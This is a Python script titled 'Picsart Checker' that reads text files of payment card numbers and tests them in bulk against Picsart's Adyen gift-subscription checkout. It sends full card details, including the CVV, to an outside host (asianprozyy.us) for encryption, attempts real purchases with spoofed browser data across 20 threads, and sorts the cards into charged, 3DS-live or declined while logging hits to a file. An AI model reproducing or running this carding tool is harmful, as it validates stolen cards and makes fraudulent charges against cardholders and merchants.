import sys
import requests
import re
import json
import os
import uuid
import time
import ctypes
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

if os.name == 'nt':
    os.system("")
    os.system("mode con cols=130 lines=30")

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

print_lock = Lock()

def clear_line():
    print('\r\033[K', end='', flush=True)

def get_checkout_attempt_id():
    url = "https://checkoutanalytics-live.adyen.com/checkoutanalytics/v3/analytics"
    querystring = {"clientKey": "live_AWRY4KLIVNGCRDVAOUBDDX4OU4UE4VPH"}
    
    payload = {
        "version": "6.12.0",
        "channel": "Web",
        "platform": "Web",
        "buildType": "esm",
        "locale": "en-US",
        "referrer": "https://picsart.com/pricing/special-offer/gift",
        "screenWidth": 1920,
        "containerWidth": 0,
        "component": "scheme",
        "flavor": "components",
        "level": "all"
    }
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(url, json=payload, headers=headers, params=querystring, timeout=10)
        
        if response.status_code == 200:
            try:
                result = response.json()
                if isinstance(result, dict):
                    if 'checkoutAttemptId' in result:
                        return result['checkoutAttemptId']
                    elif 'id' in result:
                        return result['id']
            except:
                pass
    except Exception:
        pass
    
    return str(uuid.uuid4()) + str(int(time.time() * 1000)) + "C1DCEF21E46D212F48F5B8517E50932C590D7B5E0EF3A3977CB31686F71049F0"[:32]

def extract_access_token(html_content):
    pattern = r'"refreshTokenResJson":\s*{\s*"response":\s*{\s*"access_token":\s*"([^"]+)"'
    match = re.search(pattern, html_content)
    
    if match:
        return match.group(1)
    
    pattern2 = r'access_token":"([^"]+)"'
    match = re.search(pattern2, html_content)
    
    if match:
        return match.group(1)
    
    return None

def refresh_token():
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
    }
    
    try:
        response = requests.get('https://picsart.com/pricing/special-offer/gift', headers=headers, timeout=10)
        
        if response.status_code == 200:
            access_token = extract_access_token(response.text)
            if access_token:
                return access_token
    except Exception:
        pass
    
    return None

def process_card(card_line, stats):
    
    parts = re.sub(r'[^0-9|]+', '', card_line).split('|')
    if len(parts) != 4:
        with print_lock:
            stats['errors'] += 1
        return f" [{Colors.RED}ERROR{Colors.RESET}] {Colors.RED}{card_line}{Colors.RESET} [{Colors.RED}Invalid format{Colors.RESET}]"
    
    cc, mm, yyyy, cvv = parts
    
    if mm == "10":
        mm_clean = "10"
    else:
        mm_clean = mm.lstrip('0')
    
    if len(yyyy) == 2:
        yyyy = '20' + yyyy
    
    brand = "visa" if cc[0] == "4" else "mc"
    
    checkout_attempt_id = get_checkout_attempt_id()
    
    token_to_use = refresh_token()
    if not token_to_use:
        with print_lock:
            stats['errors'] += 1
        return f" [{Colors.RED}ERROR{Colors.RESET}] {Colors.RED}{card_line}{Colors.RESET} [{Colors.RED}Token failed{Colors.RESET}]"
    
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        }
        
        json_data = {
            'card': f'{cc}|{mm}|{yyyy}|{cvv}',
            'adyenKey': '10001|C6EF5A6E98A3FFE920C6347D16B8203F4A478CFA672D4CC76F3D0976AB81F51BFDCEB81155A05B677D7892F567BDBA9149009787838F9E7F619105717CB3A068FA636B9AF967876B978B0E55E53E86E58F4F62AA822FE79B0211B6A6007D461D7E13DFFD191EAD8AC6C1C877BB11A34544FE42B4FE021793C29620B896CBDC6C0680D0C6C9E59AC6239EDF5BE28DEB27DA9F535C3E6FFE1C2B4EFED06309F396AC3E532B3395A43B510293AEFF7D8EF9DEB36C98FF35C351DD5704BA14FE1BAC7A21FBB493F7CEA5CEBAB1BFE15CAF2BFBE9840353EE628B8915F8B3847AB8AE1761A15D506844E37C7104E466DE17D51625806692EC8C25072280D715319059',
            'version': '5.5.1',
            'origin': 'https://picsart.com',
            'originKey': 'live_AWRY4KLIVNGCRDVAOUBDDX4OU4UE4VPH',
        }
        
        response = requests.post('https://asianprozyy.us/encrypt/adyenv2', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()
        encrypt_data = response.json()
        
        if not encrypt_data.get('success'):
            with print_lock:
                stats['errors'] += 1
            return f" [{Colors.RED}ERROR{Colors.RESET}] {Colors.RED}{card_line}{Colors.RESET} [{Colors.RED}Encryption failed{Colors.RESET}]"
        
        encryptedCardNumber = encrypt_data.get('encryptedCardNumber')
        encryptedExpiryMonth = encrypt_data.get('encryptedExpiryMonth')
        encryptedExpiryYear = encrypt_data.get('encryptedExpiryYear')
        encryptedSecurityCode = encrypt_data.get('encryptedSecurityCode')
        riskData = encrypt_data.get('riskData')
        
        url = "https://api.picsart.com/shop/subscription/adyen/purchase"
        
        payload = {
            "items": [{"id": "gift_pro_monthly"}],
            "adyenData": {
                "riskData": {"clientData": riskData},
                "paymentMethod": {
                    "type": "scheme",
                    "holderName": "",
                    "encryptedCardNumber": encryptedCardNumber,
                    "encryptedExpiryMonth": encryptedExpiryMonth,
                    "encryptedExpiryYear": encryptedExpiryYear,
                    "encryptedSecurityCode": "",
                    "brand": brand,
                    "checkoutAttemptId": checkout_attempt_id
                },
                "browserInfo": {
                    "acceptHeader": "*/*",
                    "colorDepth": 32,
                    "language": "en-US",
                    "javaEnabled": False,
                    "screenHeight": 1080,
                    "screenWidth": 1920,
                    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
                    "timeZoneOffset": -480
                },
                "origin": "https://picsart.com",
                "clientStateDataIndicator": True
            },
            "redirectUrl": "https%3A%2F%2Fpicsart.com%2Fpricing%2Fspecial-offer%2Fgift",
            "analyticsInfo": {"impact_click_id": ""}
        }
        
        headers2 = {
            "x-app-authorization": f"Bearer {token_to_use}",
            "authorization": f"Bearer {token_to_use}",
            "Content-Type": "application/json"
        }
        
        response2 = requests.post(url, json=payload, headers=headers2, timeout=10)
        
        if response2.status_code == 201:
            try:
                result = response2.json()
                result_code = result.get('response', {}).get('resultCode', 'Unknown')
                
                if result_code != "Refused":
                    try:
                        with open("rawresp.txt", "a") as f:
                            f.write(f"{card_line} | {result_code} | {json.dumps(result)}\n")
                    except Exception:
                        pass
                
                if result_code == "Authorised":
                    with print_lock:
                        stats['charged'] += 1
                    return f"[{Colors.GREEN}C{Colors.RESET}] {Colors.GREEN}{card_line}{Colors.RESET} [{Colors.GREEN}Authorised{Colors.RESET}]"
                elif result_code == "RedirectShopper":
                    with print_lock:
                        stats['live'] += 1
                    return f"[{Colors.PURPLE}3DS{Colors.RESET}] {Colors.PURPLE}{card_line}{Colors.RESET} [{Colors.PURPLE}RedirectShopper{Colors.RESET}]"
                elif result_code == "Refused":
                    with print_lock:
                        stats['declined'] += 1
                    return f" [{Colors.RED}D{Colors.RESET}] {Colors.RED}{card_line}{Colors.RESET} [{Colors.RED}Refused{Colors.RESET}]"
                else:
                    with print_lock:
                        stats['declined'] += 1
                    return f" [{Colors.YELLOW}D{Colors.RESET}] {Colors.YELLOW}{card_line}{Colors.RESET} [{Colors.YELLOW}{result_code}{Colors.RESET}]"
            except:
                with print_lock:
                    stats['errors'] += 1
                return f" [{Colors.RED}E{Colors.RESET}] {Colors.RED}{card_line}{Colors.RESET} [{Colors.RED}Invalid response{Colors.RESET}]"
        else:
            with print_lock:
                stats['errors'] += 1
            return f" [{Colors.RED}E{Colors.RESET}] {Colors.RED}{card_line}{Colors.RESET} [{Colors.RED}HTTP {response2.status_code}{Colors.RESET}]"
            
    except Exception as e:
        with print_lock:
            stats['errors'] += 1
        return f"[{Colors.RED}E{Colors.RESET}] {Colors.RED}{card_line}{Colors.RESET} [{Colors.RED}{str(e)[:50]}{Colors.RESET}]"

def find_cc_file():
    possible_names = ['cc.txt', 'cards.txt', 'list.txt', 'ccs.txt']
    
    for name in possible_names:
        if os.path.exists(name):
            return name
    
    return None

def update_title(checked, total, charged, live, declined):
    title = f"Picsart Checker by @ixcynigga | Checked: {checked}/{total} | Charged: {charged} | Live: {live} | Declined: {declined}"
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        sys.stdout.write(f"\x1b]2;{title}\x07")
        sys.stdout.flush()

def main():
    filename = None
    
    if len(sys.argv) == 2:
        filename = sys.argv[1]
        if not os.path.exists(filename):
            print(f"Error: File '{filename}' not found")
            sys.exit(1)
    else:
        filename = find_cc_file()
        if not filename:
            print("Error: No cc.txt found and no file specified")
            print("\nUsage: python pc.py [filename]")
            sys.exit(1)
    
    try:
        with open(filename, 'r') as file:
            cards = [line.strip() for line in file if line.strip() and not line.startswith('#')]
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)
    
    if not cards:
        print("Error: No cards found in file")
        sys.exit(1)
    
    total_cards = len(cards)
    
    if os.name == 'nt':
        os.system("cls")
    else:
        os.system("clear")
    
    print(f"📁 Loaded {total_cards} cards from {filename}")
    print("────────────────────────────────────────────────────────────")
    
    stats = {
        'charged': 0,
        'live': 0,
        'declined': 0,
        'errors': 0
    }
    
    update_title(0, total_cards, 0, 0, 0)
    
    max_workers = min(20, total_cards)  
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_card = {executor.submit(process_card, card, stats): card for card in cards}
        
        completed = 0
        for future in as_completed(future_to_card):
            result = future.result()
            print(result)
            completed += 1
            update_title(completed, total_cards, stats['charged'], stats['live'], stats['declined'])
    
    print("────────────────────────────────────────────────────────────")
    print(f"✅ Complete! Checked: {total_cards} | Charged: {stats['charged']} | Live: {stats['live']} | Declined: {stats['declined']} | Errors: {stats['errors']}")

if __name__ == "__main__":
    main()